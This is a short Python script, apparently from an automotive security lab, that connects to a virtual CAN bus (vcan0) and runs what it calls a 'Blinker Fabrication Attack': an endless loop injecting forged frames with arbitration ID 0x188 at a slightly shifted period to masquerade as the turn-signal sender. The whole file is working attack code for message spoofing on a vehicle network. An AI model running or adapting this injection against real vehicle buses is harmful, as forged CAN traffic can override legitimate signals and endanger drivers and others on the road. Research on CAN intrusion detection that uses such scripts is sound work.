import can
import time

try:
    bus = can.interface.Bus('vcan0', interface='socketcan')
    print("Connected to vcan0. Starting Blinker Fabrication Attack...")
except Exception as e:
    print(f"Error: {e}")
    exit()
    
print("Masquerade: Sending messages with altered clock for ID 0x188...")
msg = can.Message(arbitration_id=0x188, data=[0x01, 0x00, 0x00, 0x00], is_extended_id=False)

try:
    while True:
        bus.send(msg)
        time.sleep(0.0205)
except KeyboardInterrupt:
    print("Attack stopped.")